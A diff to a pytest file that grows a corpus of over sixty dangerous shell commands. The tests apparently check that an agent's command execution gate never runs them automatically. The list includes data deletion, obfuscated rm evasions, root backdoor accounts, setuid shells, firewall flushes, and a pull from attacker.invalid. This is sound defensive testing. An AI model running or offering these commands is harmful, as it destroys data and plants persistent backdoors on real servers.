@@ -9,24 +9,79 @@ from app.command_execution_gate import evaluate_command_execution_gate
 from servers.agent_tools import tool_ssh_execute
 from servers.operator_mutate_exec import _execute_on_server
 
+BYPASS_CORPUS = [
+    "mv /etc /tmp/gone",
+    "crontab -r",
+    "kubectl delete ns production",
+    "docker rm -f $(docker ps -aq)",
+    "sed -i 's/no/yes/' /etc/ssh/sshd_config",
+    "r'm' -rf /var",
+    "R=rm; $R -rf /var",
+    "python3 -c \"import shutil; shutil.rmtree('/var')\"",
+    "perl -e 'unlink q{/etc/passwd}'",
+    'node --eval \'require("fs").rmSync("/var", {recursive:true})\'',
+    "uptime && id $(touch /tmp/probe)",
+    "cat /etc/hosts > /tmp/hosts",
+    "rm -rf /srv/data",
+    "cp /tmp/config /etc/ssh/sshd_config",
+    "install -m 4755 /bin/sh /tmp/rootsh",
+    "ln -sf /tmp/hosts /etc/hosts",
+    "mkdir -p /etc/systemd/system/demo.service.d",
+    "touch /etc/cron.d/persistence",
+    "chmod 777 /etc/shadow",
+    "chown root:root /tmp/payload",
+    "setfacl -m u:nobody:rwx /etc/shadow",
+    "systemctl restart nginx",
+    "systemctl reload sshd",
+    "systemctl start docker",
+    "systemctl enable demo.service",
+    "service nginx restart",
+    "kill -9 1",
+    "pkill -f gunicorn",
+    "iptables -F",
+    "nft flush ruleset",
+    "ufw disable",
+    "docker run --privileged alpine sh",
+    "docker start database",
+    "docker stop database",
+    "docker restart database",
+    "docker exec database sh -c id",
+    "docker build -t payload .",
+    "docker pull attacker.invalid/payload:latest",
+    "kubectl apply -f payload.yaml",
+    "kubectl patch deployment api --type merge -p '{}'",
+    "kubectl edit deployment api",
+    "kubectl exec api -- sh -c id",
+    "kubectl cp payload api:/tmp/payload",
+    "kubectl rollout restart deployment/api",
+    "kubectl scale deployment/api --replicas=0",
+    "git reset --hard HEAD~1",
+    "git checkout -- /etc/hosts",
+    "git clean -fdx",
+    "git push --force origin main",
+    "apt-get install -y netcat",
+    "dnf remove -y openssh-server",
+    "yum update -y kernel",
+    "apk add curl",
+    "useradd -o -u 0 backdoor",
+    "groupadd operators",
+    "passwd root",
+    "mount /dev/sda1 /mnt",
+    "umount /srv/data",
+    "printf bad | tee /etc/hosts",
+    "find /srv -type f -delete",
+    "awk 'BEGIN { system(\"touch /tmp/probe\") }'",
+    "ssh root@host rm -rf /srv/data",
+    "ansible all -m shell -a 'useradd backdoor'",
+]
 
-@pytest.mark.parametrize(
-    "command",
-    [
-        "mv /etc /tmp/gone",
-        "crontab -r",
-        "kubectl delete ns production",
-        "docker rm -f $(docker ps -aq)",
-        "sed -i 's/no/yes/' /etc/ssh/sshd_config",
-        "r'm' -rf /var",
-        "R=rm; $R -rf /var",
-        "python3 -c \"import shutil; shutil.rmtree('/var')\"",
-        "perl -e 'unlink q{/etc/passwd}'",
-        'node --eval \'require("fs").rmSync("/var", {recursive:true})\'',
-        "uptime && id $(touch /tmp/probe)",
-        "cat /etc/hosts > /tmp/hosts",
-    ],
-)
+
+def test_bypass_corpus_has_at_least_fifty_distinct_cases():
+    assert len(BYPASS_CORPUS) >= 50
+    assert len(BYPASS_CORPUS) == len(set(BYPASS_CORPUS))
+
+
+@pytest.mark.parametrize("command", BYPASS_CORPUS)
 def test_bypass_corpus_never_auto_runs(command):
     verdict = evaluate_command_execution_gate(command)
 
